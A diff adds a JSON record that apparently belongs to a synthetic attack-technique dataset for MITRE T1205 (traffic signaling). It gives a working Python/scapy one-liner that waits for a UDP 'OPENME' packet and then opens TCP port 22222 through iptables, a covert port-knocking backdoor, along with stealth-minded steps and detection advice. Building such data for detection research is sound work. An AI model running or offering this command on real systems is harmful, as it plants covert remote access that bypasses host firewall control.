@@ -1,0 +1,24 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "python3 -c \"from scapy.all import sniff,Raw; import os; sniff(filter='udp and port 40001', prn=lambda p: os.system('iptables -I INPUT -p tcp --dport 22222 -j ACCEPT') if p.haslayer(Raw) and b'OPENME' in bytes(p[Raw]) else None, stop_filter=lambda p: p.haslayer(Raw) and b'OPENME' in bytes(p[Raw]))\"",
+  "explanation": "Sniffs for a UDP magic word 'OPENME' and, when seen, inserts a firewall rule to expose TCP/22222. Requires root to sniff and modify iptables; would normally be done via sudo. Detection: look for packet sniffers binding to interfaces and unsolicited firewall rule insertions tied to UDP/40001 traffic.",
+  "rationale_steps": [
+    "Attach a scapy sniffer to UDP/40001.",
+    "Check Raw payload for the trigger string.",
+    "On match, open hidden service port 22222 via iptables.",
+    "Stop sniffing after activation to minimize footprint.",
+    "Detection: process monitoring for Python/scapy; correlate with iptables audit logs and UDP/40001 payload anomalies."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-9c13d104-64101320",
+  "source_prompt_hash": "9c13d104",
+  "timestamp_utc": "2025-09-30T05:40:25.546732Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
